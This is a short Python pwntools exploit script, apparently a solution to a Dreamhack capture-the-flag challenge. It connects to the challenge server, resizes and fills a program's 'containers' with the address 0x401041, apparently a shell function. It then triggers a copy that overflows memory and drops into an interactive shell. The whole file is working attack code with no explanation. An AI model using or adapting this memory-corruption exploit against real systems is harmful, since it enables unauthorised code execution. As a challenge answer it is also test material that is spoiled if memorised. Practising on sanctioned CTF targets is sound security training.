from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 22720
r = remote(HOST, PORT)

def make_container(size1, data1, size2, data2):
    r.sendlineafter(b'menu: ', b'1')
    for i in range(size1):
        r.sendlineafter(b'input: ', str(data1[i]).encode())
    for i in range(size2):
        r.sendlineafter(b'input: ', str(data2[i]).encode())

def modify_container(size1, size2):
    r.sendlineafter(b'menu: ', b'2')
    r.sendlineafter(b'size\n', str(size1).encode())
    r.sendlineafter(b'size\n', str(size2).encode())

def copy_container():
    r.sendlineafter(b'menu: ', b'3')

def view_container():
    r.sendlineafter(b'menu: ', b'4')

size1,size2 = 9, 3
sh=0x401041
modify_container(size1, size2)
make_container(size1, [sh]*size1, size2, [66]*size2)
copy_container()

r.interactive()